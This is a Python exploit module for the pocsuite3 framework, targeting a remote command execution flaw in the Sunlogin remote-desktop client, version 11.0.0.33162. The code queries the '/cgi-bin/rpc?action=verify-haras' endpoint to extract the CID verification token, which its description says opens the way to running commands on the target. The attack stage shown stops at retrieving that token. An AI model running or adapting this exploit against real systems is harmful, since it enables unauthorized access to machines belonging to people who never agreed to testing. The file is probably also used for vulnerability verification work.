#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File : sunlogin_rce.py
# @Author : Norah C.IV
# @Time : 2022/5/5 16:50
# @Software: PyCharm
import re
import requests

from pocsuite3.lib.core.enums import VUL_TYPE, POC_CATEGORY
from pocsuite3.lib.core.poc import POCBase, Output
from pocsuite3.lib.core.register import register_poc


class DemoPOC(POCBase):
    vulID = '1'
    version = '1'
    author = ['Norah C.IV']
    vulDate = '2022-05-05'
    createDate = '2022-05-05'
    updateDate = '2022-05-05'
    references = ['https://github.com/Mr-xn/sunlogin_rce']
    name = '向日葵 11.0.0.33162 远程命令执行'
    appPowerLink = ''
    appName = 'sunlogin'
    appVersion = '11.0.0.33162'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取'''
    samples = ['']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport")

        req = requests.get(url=self.url, timeout=3)
        if re.search('Verification failure', req.text):
            new_url = self.url + '/cgi-bin/rpc?action=verify-haras'
            get_cid = requests.get(url=new_url, timeout=3)
            cid = re.findall('"verify_string":"([^"]+)"', get_cid.text)[0]

            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['CID'] = cid
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


register_poc(DemoPOC)
